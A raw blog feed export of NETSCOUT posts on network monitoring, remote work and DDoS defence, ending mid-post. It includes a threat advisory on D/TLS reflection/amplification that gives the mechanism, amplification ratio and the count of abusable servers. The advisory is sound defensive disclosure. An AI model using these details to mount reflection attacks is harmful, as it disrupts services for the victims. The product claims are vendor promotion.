  <content:encoded><![CDATA[<p>Each year,<a data-entity-substitution="canonical" data-entity-type="node" data-entity-uuid="0793526d-846a-429c-a9f2-043fb4bdb771" href="http://localhost:7996/solutions/insurance" title="Insurance"> insurance companies </a>offer a short window of time for people to evaluate and select health care benefits. . Typically offered through corporate employers, employees approach this decision with careful attention, often researching specific elements of each provider and plan to find the option that best fits of their needs.</p>

<p>This process often involves a <a data-entity-substitution="canonical" data-entity-type="node" data-entity-uuid="d7ebd083-a536-4904-8ee3-ef4f9b45f0eb" href="http://localhost:7996/solutions/unified-communications-collaboration/contact-centers" title="Contact Centers">call to customer service representatives</a> providers to ask key questions on coverage, providers, and costs. Those calls, which are often the first experience the employee has with the organization, essentially become the ‘face’ of the company, and represent an important barometer when it comes to user experience. . Anything less than a high-quality experience can create a negative impression in the minds of these employees. Should there be such incidents of voice choppiness, echoes, or dropped calls, frustration will build with the callers and negatively impact the enrollment success.</p>

  <title>Is Your VPN Gateway Vulnerable to DDoS Attacks?</title>
  <link>http://localhost:7996/blog/your-vpn-gateway-vulnerable-ddos-attacks</link>
  <description>VPN gateways are a crucial link for business performance, which makes them a ripe target. Taking steps to protect these gateways is prudent.</description>
  <content:encoded><![CDATA[<p>It’s already difficult to remember when working from home wasn’t the practice for many workers. As this new reality set in, businesses of all stripes had to increasingly rely on their network connectivity to continue business-as-usual activities. According to a <a href="https://www.mckinsey.com/featured-insights/future-of-work/what-800-executives-envision-for-the-postpandemic-workforce">McKinsey</a> survey conducted in June 2020, “85 percent of respondents indicated that their businesses have somewhat or greatly accelerated the implementation of technologies that digitally enable employee interaction and collaboration, such as videoconferencing and filesharing.”</p>

<p>For most businesses, a secure virtual private network (VPN) connections have been a lifeline for remote workers. However, cyber attackers increasingly have targeted <a href="https://www.netscout.com/blog/how-protect-vpn-availability-and-ensure-business-continuity">VPN gateways</a> with distributed denial-of-service (DDoS) attacks that threaten to disrupt or even shut down these vital connectivity points, effectively denying employees access to key business applications.</p>

<p>VPN gateways are a crucial link for business performance, which makes them a ripe target. Taking steps to protect these gateways is prudent.</p>

<h3>Better Safe Than Sorry</h3>

<p>Cybersecurity experts at NETSCOUT recommend that organizations take the following measures to better defend vulnerable access points from cyber attackers:</p>

<ul>
	<li><strong>Make the most of built-in protection. </strong>Most software-as-a-service (SaaS) providers utilize DDoS protection to maintain the availability of their services. For this reason, it makes sense to use SaaS-based services for everyday business applications, content sharing, collaboration, and communications, because these connections are already well protected.</li>
	<li><strong>Double check that you are using the Best Current Practices (BCPs). </strong>Implementing BCPs for network infrastructure, servers, and services such as DNS is key to building in attack resilience. For starters, make sure you've deployed intelligent DDoS mitigation systems to protect all public-facing servers, services, applications, data, and support infrastructure such as remote access technology against DDoS attacks.</li>
	<li><strong>Use dedicated internet transit links for VPNs. </strong>Using links not associated with components such as DNS servers and public-facing websites can cut down on the likelihood that events such as DDoS attacks will prevent remote security operational IT from responding when their skills are needed the most.</li>
	<li><strong>Use remote-access integration. </strong>Make sure that remote-access mechanisms are integrated with the organization's authentication, authorization, and accounting systems, and require the use of multi-factor authentication (MFA) technologies for user access.</li>
	<li><strong>Get smart about DNS naming.</strong> Many attackers do their homework before launching targeted DDoS attacks, so don't make their jobs easier by doing something like using the string "vpn" in DNS resource records for VPN concentrators. Instead, choose a DNS naming convention that provides useful information to operational personnel while keeping attackers in the dark about key functional areas.</li>
</ul>

<p>Building DDoS protective measures into your security plans from the outset can go a long way toward minimizing exposure of vital VPN gateways and ensuring your network performance.</p>

  <title>Building a Cybersecurity Strategy for the COVID-19 Vaccine</title>
  <link>http://localhost:7996/blog/building-cybersecurity-strategy-covid-19-vaccine</link>
  <description>The emergence of effective COVID-19 vaccines represents an extraordinary scientific achievement—as well as a global challenge when it comes to the logistics involved in getting needles into arms. And bad actors are paying attention. Always fans of the opportunistic pivot, cybercriminals know that if it’s important to us, it’s an opportunity for them.</description>
  <content:encoded><![CDATA[<p>The emergence of effective COVID-19 vaccines represents an extraordinary scientific achievement—as well as a global challenge when it comes to the logistics involved in getting needles into arms. And as the news is filled with stories vaccine rollout, eligibility, and scheduling, bad actors are paying attention. Always fans of the opportunistic pivot, cybercriminals know that if it’s important to us, it’s an opportunity for them.</p>

<p>It’s clear that <a href="https://www.netscout.com/blog/demo-blocking-ransomware-and-ddos-extortion-attacks">in-depth cybersecurity strategies</a> are essential to protect trade secrets, patents, clinical trial data, supply paths, and development and manufacturing agreements. The environment is ripe for disinformation and cyberattacks, which means that distributed denial of service (DDoS), phishing, or malware campaigns could target specific medical providers or even the general population. <a href="https://www.netscout.com/blog/something-wicked-way-comes">Vaccine-related intellectual property</a> is also highly valuable, so pharma companies are easy targets.</p>

<p>Consider the following:</p>

<ul>
	<li>The process of vaccination, which often requires two doses, requires public health authorities to collect retain accurate personal data on which individuals already received shots from which manufacturers to ensure they get the correct second dose.</li>
	<li>Countries employing so-called “<a href="https://www.weforum.org/agenda/2021/01/what-is-a-vaccine-passport-and-will-you-need-one-the-next-time-you-travel/">vaccine passports</a>” as part of the reopening process also possess a treasure trove of privacy-sensitive information. They need a thorough account of which individuals, private entities, and government authorities can access this data.</li>
</ul>

<p>Ensuring total and pervasive visibility into this potentially overwhelming volume of vaccine information is critical to securing it. This means building consistency across management systems. They should share the same underlying packet data to allow network and operations teams to make decisions in concert. These tools need to facilitate quick detection, investigation, and response to threats while making it easy to integrate with security information and event management (SIEM) platforms.</p>

<p>Hybrid cloud approaches are best because they integrate traditional network architectures in a physical data center. That way, healthcare IT professionals will retain visibility as they migrate to the cloud or roll out native applications. Tools with agentless packet access and cloud-resident virtual instrumentation add minimal load to any cloud infrastructure.</p>

<p>But gaining a pervasive view is only the beginning. It is increasingly difficult for cybersecurity teams to rely solely upon log-based data for threat detection, investigation, and remediation. Industry professionals realize that wire-based metadata and packets contain the single source of truth. Whether securing an internal corporate network, remote office location, or cloud environment, medical enterprises and public health authorities need an intelligent retrieval system that investigates and remediates breaches quickly.</p>

<p>Adding contextual, real-time analytics and threat intelligence allows users to turn massive amounts of wire data into actionable insights for efficient cyber-threat detection and investigation. Agencies should conduct host and network investigations simultaneously. The former provides visibility into internal and external host interactions, while the latter offers a 360-degree view of servers, applications, and conversations. Both of these crucial elements require packet stores for critical data and centralized indexing to enable fast retrieval and analysis.</p>

<p>Speed of execution, coordination among various agencies, and data protection will be critical to make the COVID-19 vaccine rollout a success. In the face of a global health crisis, there is no time to waste.</p>

  <title>Overcoming the Challenges of Cloud Migration </title>

  <content:encoded><![CDATA[<p>Microservice applications are fast becoming an IT preference because of the increased agility and scalability they offer. And with rising adoption, more and more organizations are migrating these microservice applications to the public cloud. According to the <a href="https://www.devprojournal.com/technology-trends/why-is-the-microservices-market-growing/"><em>DevPro Journal</em></a>, the global cloud microservice market is growing at a rate of 22.5 percent, with the U.S. market projected to maintain a growth rate of 27.4 percent.</p>

<p>As a result of such migration initiatives, enterprises are faced with increasingly complex paths between the end user and applications—with many parts of the infrastructure owned and managed by third parties. This creates a loss of visibility into both the application performance throughout the path and the end-user experience.</p>

<p><strong>The Implications of Not Identifying Service Dependencies</strong></p>

<p>IT professionals are well aware of the importance of fully understanding service dependencies associated with an on-premises microservice application operation. Here's a typical scenario: An enterprise&nbsp;IT&nbsp;team discovers&nbsp;that&nbsp;application responsiveness was much faster prior to the cloud migration. After some investigation, the slowdown is attributed to an ancillary service that remained in the data center even after the application had moved to the cloud, highlighting the critical nature of gaining visibility into service dependencies.</p>

<p>The implications of failing to identify service dependencies can manifest in two significant ways—budget and user experience. From a budget perspective, failing to inspect the amount of traffic flowing from the cloud-based application to the ancillary service means businesses may be incurring unnecessarily high transport costs from the public cloud provider. Equally troubling, users are likely to experience slow response times, leading to frustration and inefficient execution of mission-critical tasks and harming business productivity.</p>

<p><strong>Cloud Monitoring Is Key to Successful Microservice Migration </strong></p>

<p>The key to successful microservice application migration is cloud monitoring that provides invaluable insights into service dependencies. This level of visibility reveals the source of problems, enabling IT to troubleshoot and address issues more quickly. By combining appliances on premises, virtual appliances in the public cloud, and business transaction tests (BTTs), IT professionals can close visibility gaps and integrate active and passive smart data for richer analysis.</p>

<p>In the previously mentioned example, a deeper analysis into the unexpected dependency on the ancillary service revealed the volume of traffic between the application and this service. The analytics provided IT with the root cause behind the slowdown in application responsiveness from the end-user perspective.</p>

<p>In today’s enterprise IT environments, it can be very challenging for application owners to gain an accurate understanding of an app’s dependencies. The operating cost implications and potential negative impact to user experience simply cannot be ignored. That is why cloud monitoring is an absolute must. The right technology enables IT teams to visualize service dependencies to ensure app performance satisfies end-user experience requirements and helps to control expenses. In an increasingly complex, interconnected world, having this kind of visibility is imperative when migrating microservices applications to the public cloud.</p>

  <content:encoded><![CDATA[<h1 class="lead">ASERT Threat Summary</h1>

<p><strong>Date/Time: &nbsp;</strong>16Mar2021 2200UTC<br />
<strong>Severity: &nbsp;</strong>Warning<br />
<strong>Distribution: &nbsp;</strong>TLP: <a href="https://www.us-cert.gov/tlp">WHITE</a>&nbsp;<br />
<strong>Categories: &nbsp;</strong>Availability<br />
<strong>Contributors: </strong>Michele DiDedda, Jon Belanger, Chris Conrad.</p>

<h2>Overview</h2>

<p>Datagram Transport Layer Security (D/TLS) is a variant of the TLS encryption protocol implemented atop User Datagram Protocol (UDP), it is utilized to secure datagram-based applications to prevent eavesdropping, tampering, or message forgery. While an anti-spoofing mechanism was designed into D/TLS from the outset, it was described in the relevant IETF RFCs as ‘may’, rather than ‘must’ in terms of implementation requirements. &nbsp;As a result, some D/TLS implementations do not leverage this anti-spoofing mechanism by default and can thereby be abused to launch D/TLS reflection/amplification DDoS attacks.</p>

<p>The default D/TLS configuration for some Citrix Netscaler Application Delivery Controllers (ADCs) running older software versions did not initially enable the organic D/TLS anti-spoofing mechanism by default, resulting in a population of Citrix Netscaler ADCs that could abused as D/TLS reflector/amplifiers. &nbsp;It also led to the initial mischaracterization of this DDoS vector by some as Citrix-specific, while in practice there are other D/TLS implementations that, if misconfigured, could also be abused to launch D/TLS reflection/amplification attacks. &nbsp;Citrix has issued patched software and publicly encouraged its customers to upgrade their Netscaler ADCs to non-abusable software versions.</p>

<p>Misconfigured D/TLS servers that do not implement the HelloClientVerify anti-spoofing mechanism can be abused to launch UDP reflection/amplification attacks with an amplification ratio of 37.34:1. The amplified attack traffic consists of both initial UDP fragmented packets sourced from UDP/443 and non-initial fragmented UDP packets, directed towards the destination IP address(es) and UDP port(s) of the attacker’s choice.</p>

<p>The maximum observed single-vector D/TLS reflection/amplification DDoS attack size to date is ~44.6 Gbps. &nbsp;It has been utilized in multivector reflection/amplification DDoS attacks of up to ~206.9 Gbps in size. As is routinely the case with newer DDoS attack vectors, it appears that after an initial period of employment by advanced attackers with access to bespoke DDoS attack infrastructure, D/TLS reflection/amplification has been weaponized and added to the arsenals of so-called ‘booter/stresser’ DDoS-for-hire services, placing it within the reach of the general attacker population.</p>

<p>Approximately 4,283 abusable D/TLS servers have been identified to date.</p>

<h2>Collateral Impact&nbsp;&nbsp;</h2>

<p>The collateral impact of D/TLS reflection/amplification attacks is potentially quite high for organizations with D/TLS servers and/or load-balancers that are as reflectors/amplifiers. This may include partial or full interruption of mission-critical remote-access services, as well as additional service disruption due to transit capacity consumption, state-table exhaustion of stateful firewalls, load-balancers, etc.</p>

<p>Failure to upgrade or safely reconfigure abusable D/TLS servers so that they can no longer be leveraged by attackers may result in blockage of legitimate production services running on abusable D/TLS servers by network operators utilizing layer-3 or -4 mitigation techniques to defend themselves and/or their customers from D/TLS reflection/amplification DDoS attacks.</p>

<p>Wholesale filtering of UDP/443-sourced traffic by network operators may potentially overblock legitimate internet traffic, including legitimate D/TLS and QUIC, which also makes use of UDP/443&nbsp;server responses. &nbsp;&nbsp;</p>

<h2>Mitigating Factors</h2>

<p>Collateral impact to abusable D/TLS servers and/or load balancers can alert systems administrators to either disable unnecessary D/TLS services or to patch or configure them to make use of the <em>HelloVerifyRequest</em> anti-spoofing mechanism, thereby preventing them from being utilized in D/TLS reflection/amplification attacks.</p>

<h2>Recommended Actions</h2>

<p>Network operators should perform reconnaissance to identify and remediate abusable D/TLS servers on their networks and/or the networks of their downstream customers.</p>

<p>Network operators should implement all relevant network infrastructure, architectural, and operational Best Current Practices (BCPs).</p>

<p>Organizations with business-critical public-facing internet properties should implement all relevant network infrastructure, architectural, and operational BCPs, including situationally specific network access policies that only permit internet traffic via required IP protocols and ports.&nbsp;Internet access network traffic from internal organizational personnel should be deconflated from internet traffic to/from public-facing internet properties and served via separate upstream internet transit links.&nbsp;</p>

<p>DDoS defenses for all public-facing internet properties and supporting infrastructure should be implemented in a situationally appropriate manner, including periodic testing to ensure that any changes to organization’s servers/services/applications are incorporated into its DDoS defense plan. &nbsp;On-site intelligent DDoS mitigation capabilities should be combined with cloud- or transit-based upstream DDoS mitigation services in order to ensure maximal responsiveness and flexibility during an attack.</p>

<p>It is imperative that organizations operating mission-critical public-facing internet properties and/or infrastructure ensure that all servers/services/application/datastores/infrastructure elements are protected against DDoS attacks and are included in periodic, realistic tests of the organization’s DDoS mitigation plan. &nbsp;In many instances, we have encountered situations in which obvious elements such as public-facing Web servers were adequately protected, but authoritative DNS servers, application servers, and other critical service-delivery elements were neglected, thus leaving them vulnerable to attack.</p>

<p>Specifics of countermeasure selection, tuning, and deployment will vary based upon the particulars of individual networks/resources.</p>

  <title>Healthcare Organization Resolves DICOM Access Issue Thanks to nGeniusONE Service Assurance</title>
  <link>http://localhost:7996/blog/healthcare-organization-resolves-dicom-access-issue</link>
  <description>See how a leading healthcare provider used its NETSCOUT nGeniusONE Service Assurance solution to triage and diagnose the cause of access issues to the DICOM imaging service for a recently acquired hospital.</description>
  <content:encoded><![CDATA[<p>For more than 25 years, Digital Imaging and Communications in Medicine (DICOM) has been a globally adopted protocol that provides a file format for storage and a process for transmitting images throughout a healthcare network. DICOM commonly is used in conjunction with the radiology information system (RIS) typically present in healthcare environments. Doctors, nurses, diagnosticians, and others depend on medical images such as X-rays, ultrasounds, echocardiograms (EKGs), and magnetic resonance imaging (MRI) as crucial tools for accurately and quickly diagnosing patient conditions. As a result, access, availability, and speed of image retrieval is essential.</p>

<p>Merger and acquisition activity among healthcare organizations has been a standard part of business for many years. Integrating the clinical application services between newly combined organizations is complicated by the multiple vendors that may be involved. However, such integration is essential for the newly merged organizations to operate effectively. One leading U.S. healthcare provider recently used its nGeniusONE Service Assurance solution from NETSCOUT to troubleshoot and pinpoint the source of an issue that prevented a newly acquired hospital from using its DICOM imaging services. See how the IT staff and NETSCOUT team used nGeniusONE’s logical, contextual workflows to discover the source and resolve the problem.</p>

  <title>How to Get the Most from Hybrid Cloud</title>
  <link>http://localhost:7996/blog/how-get-most-hybrid-cloud</link>
  <description>A recent Forbes article from NETSCOUT CTO Bruce Kelley explains why successful hybrid cloud strategies start by putting the user experience front and center.</description>
  <content:encoded><![CDATA[<p>Cloud is often considered in terms of flexibility, which is why hybrid cloud strategies are so popular. The ability to respond to business needs by shifting applications and services across private clouds, public clouds, and on-premises data centers makes it a terrific option for a lot of businesses. In fact, a survey from Everett Group found that nearly <a href="https://enterprisersproject.com/article/2020/7/hybrid-cloud-10-statistics">three out of four companies</a> have a hybrid-first or private-first cloud strategy. If not properly managed, however, the flexibility afforded by hybrid cloud environments can become complex.</p>

<p>&nbsp;As Bruce Kelley, CTO and SVP of NETSCOUT, Service Provider points out in a recent Forbes article, successful hybrid cloud strategies start by putting the user experience front and center.</p>

<p>Read the <a href="https://www.forbes.com/sites/forbestechcouncil/2021/02/19/what-enterprises-need-to-know-to-fully-leverage-hybrid-cloud/?sh=2a25a10f17a1">full article</a> to find out more</p>

  <title>AWS Expands Support for Virtual Private Cloud Traffic Mirroring, Enhancing NETSCOUT Visibility</title>
  <link>http://localhost:7996/blog/aws-traffic-mirroring</link>
  <description>AWS Expands Support for Virtual Private Cloud Traffic Mirroring Enhancing NETSCOUT Visibility</description>
  <content:encoded><![CDATA[<p>Amazon has now expanded their Virtual Private Cloud (Amazon VPC) Traffic Mirroring to support additional select non-Nitro EC2 instance types. Amazon VPC Traffic Mirroring allows you to replicate the network traffic from EC2 instances within a VPC to selected security and monitoring appliances. This expanded <a href="https://aws.amazon.com/blogs/networking-and-content-delivery/using-vpc-traffic-mirroring-to-monitor-and-secure-your-aws-infrastructure/">VPC Traffic Mirroring</a> support of EC2 instances enables NETSCOUT to provide end-to-end visibility for security and service assurance of applications and services in running in AWS.</p>

<p>Previously, AWS customers could only enable VPC Traffic Mirroring on their Nitro-based EC2 instances. Customers can now enable VPC Traffic Mirroring on additional instances types, such as C4, D2, G3, G3s, H1, I3, M4, P2, P3, R4, X1, and X1e, that use the Xen-based hypervisor. This enables AWS customers to now uniformly inspect network traffic on these additional EC2 instance types. This feature is available in all 22 AWS regions where VPC Traffic Mirroring is currently supported.</p>

<p>Amazon VPC traffic mirroring helps NETSCOUT to seamlessly extend our packet-capturing capabilities to AWS and effectively gain visibility without borders into applications and their dependencies in hybrid cloud environments. The traffic mirrored from AWS AMI (Amazon Machine Image) workloads to NETSCOUT virtual probes deployed in AWS is transformed into smart data and analyzed to provide deep insights into application performance and security. This real time, precise, and relevant intelligence is delivered across all connected applications and their interactions with the service delivery infrastructure.</p>

<p>NETSCOUT’s virtual probes offer a cost effective and affordable on-premises and off-premises packet-capturing solution for both service assurance and security. By harnessing the intelligence of the captured packet data, we deliver a robust early warning system for both performance and security.</p>

<p>By combining Amazon VPC traffic mirroring with NETSCOUT technology, enterprises have an innovative and agentless solution to streamline the acquisition of packet data for effective monitoring for security and service assurance in hybrid cloud environments before, during, and after workload migration to AWS.</p>

<p>As <a href="https://www.netscout.com/marketplace-aws/migration">cloud migration</a> and digital transformation continues to accelerate, IT, development, and security teams and processes need increased visibility to assure agile service delivery from cloud deployments. Traffic mirroring turned into NETSCOUT smart data in AWS is key to delivering cloud migration success.</p>

  <title>Healthcare IT on Call: Dealing with Overburdened Systems</title>
  <link>http://localhost:7996/blog/Healthcare-IT-on-call</link>
  <description>Lack of visibility across the healthcare IT infrastructure hinders IT’s ability to measure the performance of the network and services. End-through-end visibility is key to identifying issues or disruptions.</description>
  <content:encoded><![CDATA[<p>When the COVID-19 pandemic first struck, one of the early casualties was normalcy. Nearly every sector of society was profoundly affected. The <a href="https://www.netscout.com/blog/protecting-healthcare-pandemic-times">healthcare industry</a>, in particular, was disrupted as doctors and hospitals primarily focused on caring for a spiraling caseload of COVID-19 patients.</p>

<p>To attend to the multitude of patients, including those not afflicted by the virus, the healthcare industry had to rapidly pivot to <a href="https://www.netscout.com/blog/connectivity-telehealth-and-telemedicine">telehealth</a> to ensure the safety of caregivers and patients alike. Many organizations had already begun to offer such services, but the need grew exponentially. According to the <a href="https://www.cdc.gov/mmwr/volumes/69/wr/mm6943a3.htm">Centers for Disease Control and Prevention</a> (CDC), in the first quarter of 2020 alone, the number of telehealth visits increased by 50 percent compared with the same period in 2019.</p>

<p><strong>The Growing Need for Reliable Connectivity </strong></p>

<p>In addition to remote care, the healthcare industry has been steadily migrating to digital channels for sharing and storing vital <a href="https://www.netscout.com/case-studies/us-medical-center-improves-healthcare-delivery">patient health records</a>, diagnostic test results, radiology imaging, and prescriptions. To meet these demands, many hospitals have turned to cloud-based business services and software-as-a-service (SaaS) applications. For example, in November electronic health record (EHR) giant <a href="https://www.beckershospitalreview.com/healthcare-information-technology/google-cloud-launches-healthcare-interoperability-program-5-things-to-know.html">Epic</a> reported more than 221 million patient records were shared using its Care Everywhere interoperability platform, which represents a 40 percent increase year over year.</p>

<p>With an increase in the number of devices, users, and applications relying on vital network connectivity, healthcare providers have had to dramatically increase their bandwidth. At the same time, healthcare IT professionals are under tremendous pressure to assure the performance of networks, applications, and services. Any unplanned disruptions can be truly catastrophic, and even planned migrations, application upgrades, or system changes can be disruptive, which has major healthcare implications.</p>

<p>As demand has grown, the size and complexity of digital infrastructures also have grown, creating new challenges and risks. Adding to the challenge for IT, healthcare providers often use technologies from multiple vendors. This means that IT teams are tasked with overcoming integration and interoperability issues. As is often the case, each vendor provides visibility into the performance of its own system or application. And although this visibility might reveal that specific applications, network and cloud tools, and databases are operating optimally, issues affecting end users still may occur. Because the tools are siloed, there is no big-picture view that can reveal a problem or problems, let alone how to resolve them.</p>

<p><strong>Ensuring Network Performance </strong></p>

<p>Lack of visibility across the entire IT infrastructure hinders IT’s ability to measure the performance of the network and all of its many component services. Gaining end-through-end visibility is key to evaluating data, traffic, voice, video, and other network factors in order to identify issues or disruptions throughout the infrastructure.&nbsp;</p>

<p>By holistically monitoring network performance—attaining extensive visibility across private data centers, public cloud, and SaaS—healthcare IT professionals are better positioned to support complex digital infrastructures and ultimately ensure the best possible user experience. In this instance, that can mean the difference between life and death.</p>

  <title>Financial Services Company Assures Services to Customers and Employees During Data Center Transformation </title>
  <link>http://localhost:7996/blog/financial-services-company-assures-services</link>
  <description>See how a financial technology and stock exchange organization used its nGeniusONE Service Assurance solution to gain visibility into its data center transformation to Cisco ACI and AWS Cloud.</description>
  <content:encoded><![CDATA[<p>An international financial services company had gone through a period of substantial growth driven by robust customer growth, increased exchange volume, and several mergers and acquisitions. With a diversified market infrastructure supporting an <a href="https://www.netscout.com/solutions/capital-markets">international stock exchange; financial information; and equity, bond, and derivative market securities</a>, the organization needed to deliver high-quality service levels to its global institutional and private investors—and to its thousands of employees.</p>

<p>To support anticipated volume at the service levels its customers demanded, the company initiated a strategic data center transformation based on Cisco Application Centric Infrastructure, along with targeted migration to public cloud—initially to Amazon Web Services. See how this organization leveraged <a href="https://www.netscout.com/product/ngeniusone-platform">NETSCOUT’s nGeniusONE Service Assurance</a> for visibility as it rolled out a new data center.</p>

  <title>Remote Work: A Wake-up Call for Digital Infrastructure </title>
  <link>http://localhost:7996/blog/remote-work-wake-call-digital-infrastructure</link>
  <description>Regardless of the technologies deployed, organizations must provide a single, unified management and security control plane that supports the changing needs of remote workers without sacrificing the user experience.</description>
  <content:encoded><![CDATA[<p>The pandemic-driven massive shift to remote work has triggered complex technology challenges as companies wrestle with maintaining a high-quality user experience for both customers and employees.</p>

<p>This trend has increased reliance on virtual private networks (VPNs), which provide an encrypted, point-to-point connection between remote workers and their corporate digital infrastructure. Although VPNs offer security, they don’t ensure performance. Other schemes and tools that have become popular include <a href="https://www.netscout.com/blog/four-reasons-why-wire-data-insights-help-citrix-vdi">virtual desktop infrastructure (VDI)</a>, wide-area networks (WANs), software-defined WAN (SD-WAN), cloud access security brokers (CASBs), and secure access service edge (SASE) technologies.</p>

<p>No matter the mix of these technologies, two priorities remain paramount: performance and security. Without adequate performance, personnel cannot get their work done. And without sufficient security, bad actors can take advantage of the work-from-home arrangement to compromise the digital infrastructure itself.</p>

<p><strong>The Rise of Edge Computing </strong></p>

<p>Technologies such as VPN, VDI, SD-WAN, CASB, and SASE have become a crucial part of the technology fabric that implements, manages, and secures the entire edge.</p>

<p>But to support the changing needs of the remote worker without sacrificing the user experience companies must provide a single, unified management and security control plane across the entire digital infrastructure.</p>

<p>For starters, modern IT shops must leverage a next generation of tooling to deliver, manage, and secure reliable user experiences across the board. Organizations must also move to a new way of thinking about the corporate network, as traditional hub-and-spoke architectures give way to the more powerful and flexible, but more complicated edge computing model.</p>

<p><strong>Visibility Is Key to Managing and Securing the Network </strong></p>

<p>To access availability and reliability issues in an edge computing environment, IT requires visibility into the activity of work-from-home employees, along with visibility into how application dependencies are delivering services. Managing and securing the network requires packet-level visibility. Taking that visibility a step further, IT can use network traffic analysis (NTA) to manage the user experience across highly complex combinations of networking technologies.</p>

<p>Adding synthetic transactions to the NTA perspective enables IT to further isolate performance problems, whether those problems involve a home network or an internet service provider (ISP). And with continuous testing of services, IT can be alerted to problems before they significantly impact users.</p>

<p>Leveraging NTA and synthetic tests to provide real-time monitoring and measurement of user experience, even in complex, dynamic networks, can be instrumental in resolving and identifying the root cause of issues when they occur on any infrastructure platform, including edge computing, public and private clouds, and legacy network environments.</p>

<p>The future success of the work-from-home trend will be entirely dependent on IT getting security and performance right. All of these changes, both organizational and technological, add risk that organizations must assess and manage. Added complexity only amplifies this risk, and organizations must provide strong measurement and responses to issues when they occur.</p>

  <title>For Many, Remote Work Is Here to Stay. Can IT Deliver on User Expectations?</title>
  <link>http://localhost:7996/blog/many-remote-work-here-stay-can-it-deliver-user-expectations</link>
  <description>Although a large percentage of the global workforce today is working remotely, the future of this trend is uncertain. One thing that is certain is the need to assure end-user experience.</description>
  <content:encoded><![CDATA[<p>If 2020 has taught us one thing, it’s that trend forecasting is vulnerable to unpredictable forces of nature. However, we’d give good odds to the following: remote work of some sort will <a href="https://www.reuters.com/article/us-health-coronavirus-technology/permanently-remote-workers-seen-doubling-in-2021-due-to-pandemic-productivity-survey-idUSKBN2772P0">become a permanent change</a> for a growing portion of the global workforce. And that adds up to <a href="https://www.netscout.com/blog/genie-out-bottle-business-continuity-locked-down-world">new challenges for IT.</a></p>

<p><strong>Remote Work Shifts IT’s Focus</strong></p>

<p>When the rapid shift to remote work hit at the onset of pandemic lockdown, IT professionals had to quickly <a href="https://www.netscout.com/blog/your-vpn-task">provide the infrastructure</a> to support this change. Now, IT needs a longer-term strategy that supports end-user expectations—while dealing with increasing infrastructure complexity.</p>

<p>What’s the best way to provide access to applications and services to make work, collaboration, and connectivity successful from a remote setting? How much capacity is needed? How do you provide a seamless experience when those applications sprawl across multiple cloud environments and on-premises data centers? Indeed, investments in cloud services will only increase as companies look to gain the agility and flexibility needed to meet dynamically changing business requirements.</p>

<p>Planning for remote work has also driven increased commitment to remote access technology such as virtual private networks (VPNs) and <a href="https://www.netscout.com/blog/four-reasons-why-wire-data-insights-help-citrix-vdi">virtual desktop infrastructure (VDI)</a>, along with security-related upgrades to ISP links, firewalls, and VPN concentrators.&nbsp;</p>

<p>At the same time, lines of business within many organizations are working to improve online services, introduce mobile apps for customers, and drive critical revenue-generating opportunities. This, in turn, puts still more pressure on IT to ensure a quality end-user experience.</p>

<p>The growing complexity of digital infrastructure, applications, and services, coupled with a lack of visibility into those services and all their dependencies, is a shortcoming that puts IT behind the eight ball when it comes to ensuring optimal performance for remote workers. The bottom line is, IT needs a big picture view of performance and security to find and fix performance issues across the entire corporate infrastructure. Unfortunately, IT currently operates with a more kaleidoscopic view, as departments use a hodgepodge of application, cloud, and network visibility tools that create a fragmented view of how their infrastructure works.</p>

<p>The key to a successful strategy for increased remote work is end-through-end visibility. By holistically monitoring network, application, and end-user performance via visibility across private data centers, public cloud, and SaaS, IT professionals are better positioned to deliver a flawless end-user experience—regardless of where those end users are performing their jobs.</p>

  <title>Demo: Blocking Ransomware and DDoS Extortion Attacks</title>
  <link>http://localhost:7996/blog/demo-blocking-ransomware-and-ddos-extortion-attacks</link>
  <description>A comprehensive cyberattack solution requires the kind of first-line (inbound) and last-line (outbound) protection NETSCOUT Arbor Edge Defense provides. Learn more in this video.</description>
  <content:encoded><![CDATA[<p><a href="https://www.netscout.com/blog/asert/lazarus-bear-armada-ddos-extortion-campaign-december-2020">Distributed denial-of-service (DDoS) extortion</a> and ransomware attacks are on the rise—and so is the financial impact, which in 2020 was estimated to exceed $20 billion globally. No business sector is off limits. Cybercriminals target businesses of every size, in every public- and private-sector vertical. Comprehensive cyberattack protection is no longer an option. It’s a necessity.</p>

<p>Although DDoS extortion and ransomware attacks <a href="https://www.netscout.com/blog/five-similarities-between-ddos-and-ransomware-attacks">share similarities</a>, there are differences. One primary difference is that <a href="https://www.netscout.com/blog/what-ddos-extortion-attack">DDoS extortion</a> is more of an immediate inbound threat, whereas ransomware usually is preceded by an attacker dwell time during which outbound communication between the compromised host and the attacker command and control occurs before the victim’s data is encrypted.</p>

<p>Therefore, a comprehensive cyberattack solution means protecting from both incoming DDoS attacks and outgoing indicators of compromise that precede ransomware: a first and last line of defense.</p>

<p>The NETSCOUT Arbor Edge Defense solution provides this comprehensive level of protection. As a first line of defense, it blocks inbound DDoS attacks. As a last line of defense, it blocks outbound Indicators of compromise to stop malware attacks before they occur.</p>

  <title>How do you respond to a DDoS Extortion Attack?</title>
  <link>http://localhost:7996/blog/how-do-you-respond-ddos-extortion-attack</link>
  <description>As ransom DDoS attack threats become more prevalent, organizations must take concrete steps to mitigate the risk.</description>
  <content:encoded><![CDATA[<p><a href="https://www.cloudflare.com/learning/ddos/what-is-a-ddos-attack/">Distributed denial-of-service (DDoS) attack</a><a data-entity-substitution="canonical" data-entity-type="node" data-entity-uuid="4dbce3cf-7733-47a9-96be-6afc3fa09c28" href="http://localhost:7996/what-is-ddos" title="What Is a Distributed Denial of Service (DDoS) Attack?">s</a>, which are designed to overwhelm and disable critical network systems of the targeted organization, were launched in record-breaking numbers in 2020. For the first time in history, the annual number of DDoS attacks crossed the 10 million threshold, with NETSCOUT’s ATLAS Security Engineering and Response Team (ASERT) observing 10,089,687 attacks over the course of the year. That’s nearly 1.6 million more attacks than 2019’s count of 8.5 million</p>

<p>The other notable DDoS activity of 2020 started in mid-August, as a relatively prolific threat actor initiated the <a href="https://www.netscout.com/blog/asert/lazarus-bear-armada-ddos-extortion-campaign-december-2020">Lazarus Bear Armada</a> (LBA) global campaign of DDoS extortion attacks, also known as ransom DDoS or RDDoS. In this type of attack, cybercriminals threaten to launch a DDoS attack if a ransom demand is not met within a set time period. Sometimes, the attackers will initiate a demonstration DDoS attack against specific elements of an organization’s online services/application delivery infrastructure to show they mean business.</p>

<p>DDoS extortion attacks are on the rise and raise the risk profile for organizations that are not prepared. Because such an attack can cripple online applications and services, it is best to protect vital assets by putting measures in place prior to a threatened attack. Law enforcement authorities and security experts advise against paying the ransom. Instead, money is better spent on putting a strong DDoS mitigation service in place.</p>

<p><strong>How to Protect Against DDoS Extortion Attacks</strong></p>

